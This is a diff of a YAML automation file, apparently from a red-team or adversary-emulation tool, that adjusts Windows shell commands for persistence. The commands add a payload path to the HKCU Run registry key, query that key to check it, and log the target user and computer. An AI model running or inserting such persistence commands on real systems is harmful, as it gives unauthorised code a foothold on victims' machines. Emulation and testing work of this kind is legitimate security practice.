@@ -31,18 +31,18 @@ actions:
   - name: create_audit_dir
     type: shell
     parameters:
-      command: 'if not exist "${audit_dir}" mkdir "${audit_dir}"'
+      command: 'mkdir "${audit_dir}"'
 
   # Registry-based persistence using variables
   - name: persistence_registry
     type: shell
     parameters:
-      command: 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}" /t REG_EXPAND_SZ /f /d "${payload_path}"'
+      command: 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "${persistence_name}" /t REG_EXPAND_SZ /f /d "${payload_path}"'
     on_success:
       - name: verify_registry
         type: shell
         parameters:
-          command: 'REG QUERY "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}"'
+          command: 'REG QUERY "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "${persistence_name}"'
 
   # Scheduled task persistence using variables
   - name: persistence_schtask
@@ -64,7 +64,7 @@ actions:
     type: shell
     parameters:
       command: |
-        echo [%DATE% %TIME%] Persistence established: ${persistence_name} > "${audit_dir}\\${log_file}"
+        echo Persistence established: ${persistence_name} > "${audit_dir}\\${log_file}"
         echo Payload: ${payload_path} >> "${audit_dir}\\${log_file}"
         echo Target: ${target_computer}\\${target_user} >> "${audit_dir}\\${log_file}"
 
